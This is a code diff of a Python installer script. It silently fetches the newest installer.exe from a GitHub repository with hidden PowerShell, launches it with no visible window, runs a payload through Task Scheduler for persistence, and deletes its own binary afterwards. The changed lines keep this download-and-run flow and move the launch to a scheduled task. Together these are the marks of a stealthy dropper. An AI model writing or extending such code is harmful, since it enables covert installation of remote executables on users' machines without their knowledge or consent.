@@ -83,7 +83,7 @@ def main():
     subprocess.run(["powershell.exe", "-Command", ps_task_cmd], creationflags=subprocess.CREATE_NO_WINDOW)
 
     cmd_installer = (
-        'powershell.exe -Command "$p=\\"$env:APPDATA\\run\\"; if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p }; '
+        '"$p=\\"$env:APPDATA\\run\\"; if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p }; '
         '$sha=(Invoke-RestMethod \'https://api.github.com/repos/yuan-miranda/run/commits/main\').sha; '
         '$o=\\"$p\\installer.exe\\"; Invoke-WebRequest -Uri \\"https://github.com/yuan-miranda/run/raw/$sha/installer.exe\\" -OutFile $o; '
         'Start-Process -FilePath $o -WindowStyle Hidden"'
@@ -103,8 +103,8 @@ def main():
     except Exception:
         pass
 
-    # 6. Launch run.exe
-    subprocess.Popen([run_exe], creationflags=subprocess.CREATE_NO_WINDOW)
+    # 6. Launch run.exe via Task Scheduler
+    subprocess.run(["schtasks", "/Run", "/TN", task_name], creationflags=subprocess.CREATE_NO_WINDOW)
 
     # 7. Self-delete installer binary after execution
     self_path = os.path.abspath(sys.argv[0])
